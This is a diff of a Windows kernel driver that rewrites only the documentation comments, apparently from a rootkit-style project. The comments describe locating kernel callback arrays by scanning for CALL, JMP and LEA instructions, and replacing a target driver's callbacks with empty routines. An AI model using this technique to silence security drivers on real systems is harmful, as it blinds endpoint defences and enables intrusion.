@@ -22,12 +22,12 @@ BeEnumerateDrivers()
     }
 }
 
-/**
- * @brief Returns the driver that contains the address passed as an argument
- * 
- * @param[in] Address The address to look up
- * 
- * @return PKLDR_DATA_TABLE_ENTRY driver that contanis the address
+/*
+ * @brief Returns the driver that contains the address passed as an argument.
+ *
+ * @param[in] Address The address to look up.
+ *
+ * @returns PKLDR_DATA_TABLE_ENTRY The driver entry containing the address, or NULL if not found.
  */
 PKLDR_DATA_TABLE_ENTRY
 BeGetDriverForAddress(_In_ UINT64 Address)
@@ -57,13 +57,15 @@ BeGetDriverForAddress(_In_ UINT64 Address)
 	return NULL;
 }
 
-/**
- * @brief Gets the address of the array where kernel callbacks are stored
- * 1) Resolve the private Psp* routine from the Ps* routine by looking for CALL or JMP instructions
- * 2) Resolve the array of callbacks from the Psp* routine by looking for LEA r13 or LEA rcx instructions
- * 
- * @param[in] Type The type of callback to resolve
- * @return UINT64 The address of the callbackRoutine array
+/*
+ * @brief Gets the address of the array where kernel callbacks are stored.
+ *
+ * 1) Resolves the private Psp* routine from the Ps* routine by looking for CALL or JMP instructions.
+ * 2) Resolves the array of callbacks from the Psp* routine by looking for LEA r13 or LEA rcx instructions.
+ *
+ * @param[in] Type The type of callback to resolve.
+ *
+ * @return UINT64 The address of the callbackRoutine array.
  */
 UINT64
 BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
@@ -165,11 +167,12 @@ BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
 	return NULL;
 }
 
-/**
- * @brief Enumerates kernel callbacks set 
- * 
- * @param[in] type Type of callback to resolve
- * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
+/*
+ * @brief Enumerates kernel callbacks set.
+ *
+ * @param[in] Type The type of callback to resolve.
+ *
+ * @returns ktd::vector<CALLBACK_DATA, PagedPool> Vector of callbacks.
  */
 ktd::vector<CALLBACK_DATA, PagedPool>
 BeEnumerateKernelCallbacks(_In_ CALLBACK_TYPE Type)
@@ -309,8 +312,13 @@ BeEmptyCreateThreadNotifyRoutine(
 	AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
 }
 
-/**
+/*
+ * @brief Replaces kernel callbacks of a specific driver with empty callback routines.
  *
+ * @param[in] TargetDriverModuleName Name of the driver whose callbacks should be replaced.
+ * @param[in] Type The type of callback to replace.
+ *
+ * @return NTSTATUS Status of the operation.
  */
 NTSTATUS
 BeReplaceKernelCallbacksOfDriver(
